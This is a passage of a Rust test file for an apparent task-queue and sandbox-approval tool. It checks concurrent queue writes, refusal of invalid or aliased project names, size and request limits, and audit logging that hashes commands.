    let raw = json!({"action": "add", "text": "Deploy", "request_id": "abcdef123456", "at": 0}).to_string();
    bench.registry.request_from("todo-update", &raw, 500).unwrap();
    let queued: Value = serde_json::from_str(fs::read_to_string(cockpit::paths::todo_updates()).unwrap().trim()).unwrap();
    assert!(queued["at"].as_i64().unwrap() > 0);
    bench.registry.request_from("todo-update", &raw, 500).unwrap();
    let lines = fs::read_to_string(cockpit::paths::todo_updates()).unwrap();
    assert_eq!(lines.lines().count(), 2);
}

#[test]
fn concurrent_host_approvals_and_filings_survive_queue_extraction() {
    let fixture = Fixture::new();
    let greywall = fixture.root.join("home/IdeaProjects/greywall");
    let greyproxy = fixture.root.join("home/IdeaProjects/greyproxy");
    fs::create_dir_all(greywall.join(".git")).unwrap();
    fs::create_dir_all(greyproxy.join(".git")).unwrap();
    let notes = "quoted \" JSON record ".repeat(400);
    for index in 0..32 {
        let mut request = json!({"action": "add", "project": "greyproxy", "text": format!("approved {index}"),
                                 "notes": notes, "request_id": format!("{index:012x}")}).as_object().unwrap().clone();
        cockpit::todo_requests::hold(&mut request, &greywall.display().to_string(), "greywall").unwrap();
    }
    let barrier = std::sync::Arc::new(std::sync::Barrier::new(5));
    let mut writers = Vec::new();
    for writer in 0..4 {
        let barrier = barrier.clone();
        let folder = greywall.display().to_string();
        let notes = notes.clone();
        writers.push(std::thread::spawn(move || {
            barrier.wait();
            for offset in 0..16 {
                let index = (writer % 2) * 16 + offset;
                if writer < 2 {
                    cockpit::todo_requests::approve(&format!("{index:012x}")).unwrap();
                } else {
                    queue_todo_update(&json!({"action": "add", "text": format!("ordinary {index}"), "notes": notes}).to_string(), &folder).unwrap();
                }
            }
        }));
    }
    let mut todos = cockpit::todo::TodoList::load();
    barrier.wait();
    while writers.iter().any(|writer| !writer.is_finished()) {
        todos.apply_updates();
        std::thread::sleep(std::time::Duration::from_millis(1));
    }
    for writer in writers { writer.join().unwrap(); }
    todos.apply_updates();
    let saved = cockpit::todo::TodoList::load();
    assert_eq!(saved.items.len(), 64, "a concurrent queue record was lost or malformed");
    assert_eq!(saved.items.iter().filter(|item| item.project() == "greyproxy" && saved.is_queued(&item.id())).count(), 32);
}

#[test]
fn a_todo_for_a_nonexistent_project_is_refused_before_queueing() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_directories.insert(500, "/p".into());
    let projects = bench.fixture.root.join("home/IdeaProjects");
    fs::create_dir_all(projects.join("notes")).unwrap();
    fs::create_dir_all(projects.join(".parallel/.git")).unwrap();
    fs::create_dir_all(projects.join("real/.git")).unwrap();
    std::os::unix::fs::symlink(projects.join("real"), projects.join("alias")).unwrap();
    for action in ["add", "propose"] {
        for target in ["no-such-project-xyz", "notes", ".parallel", "../real", "alias", ""] {
            let raw = json!({"action": action, "project": target, "text": "probe", "why": "test"}).to_string();
            let error = bench.registry.request_from("todo-update", &raw, 500).unwrap_err();
            assert!(error.contains("no project checkout named"), "{error}");
            assert!(!cockpit::paths::todo_updates().exists());
        }
    }
}

#[test]
fn a_todo_for_an_existing_project_is_queued() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_directories.insert(500, "/p".into());
    fs::create_dir_all(bench.fixture.root.join("home/IdeaProjects/greyproxy/.git")).unwrap();
    for action in ["add", "propose"] {
        let raw = json!({"action": action, "project": "greyproxy", "text": "work", "why": "test"}).to_string();
        bench.registry.request_from("todo-update", &raw, 500).unwrap();
    }
    let queued = fs::read_to_string(cockpit::paths::todo_updates()).unwrap();
    let updates: Vec<Value> = queued.lines().map(|line| serde_json::from_str(line).unwrap()).collect();
    assert_eq!(updates.len(), 2);
    assert!(updates.iter().all(|update| update["project"] == "greyproxy" && update["started_in"] == "/p"));
}

#[test]
fn a_full_todo_queue_takes_no_more() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_directories.insert(500, "/p".into());
    fs::write(cockpit::paths::todo_updates(), "x".repeat(2 << 20)).unwrap();
    assert!(bench.registry.request_from("todo-update", &json!({"action": "add", "text": "x"}).to_string(), 500).is_err());
}

#[test]
fn an_oversized_todo_update_is_refused() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_directories.insert(500, "/p".into());
    let raw = json!({"action": "add", "text": "x".repeat(70_000)}).to_string();
    assert!(bench.registry.request_from("todo-update", &raw, 500).is_err());
    assert!(!cockpit::paths::todo_updates().exists());
}

#[test]
fn a_sandbox_folder_has_at_most_three_requests_waiting() {
    // Security audit M5: one session must not fill Theo's approval queue.
    let mut bench = Bench::new();
    let (folder, key) = project_folder(&bench);
    bench.world.borrow_mut().sender_directories.insert(500, folder);
    let outcomes: Vec<bool> = ["111111111111", "222222222222", "333333333333", "444444444444"].iter()
        .map(|id| bench.registry.request_from("run-request", &json!({"id": id, "command": "true", "answers": key}).to_string(), 500).is_ok())
        .collect();
    assert_eq!(outcomes, [true, true, true, false]);
}

#[test]
fn a_request_held_or_refused_is_audited_without_its_command() {
    // Security audit M6: who asked what, from which sandbox folder; the command only as its hash.
    let mut bench = Bench::new();
    let (folder, key) = project_folder(&bench);
    bench.world.borrow_mut().sender_directories.insert(500, folder.clone());
    bench.registry.request_from("run-request", &json!({"id": NEW_RUN, "command": "make secret-step", "answers": key}).to_string(), 500).unwrap();
    let _ = bench.registry.request_from("run-request", &json!({"id": "bad"}).to_string(), 500);
    let day = cockpit::audit::dir().join(format!("audit-{}.jsonl", chrono::Local::now().format("%Y-%m-%d")));
    let lines: Vec<Value> = fs::read_to_string(day).unwrap().lines().map(|line| serde_json::from_str(line).unwrap()).collect();
    let events: Vec<(&str, &str)> = lines.iter().map(|line| (line["event"].as_str().unwrap(), line["outcome"].as_str().unwrap())).collect();
    assert_eq!(events, [("run.held", "ok"), ("run.refused", "refused")]);
    assert_eq!(lines[0]["started_in"].as_str(), Some(folder.as_str()));
    assert!(!lines[0].to_string().contains("secret-step"));
}
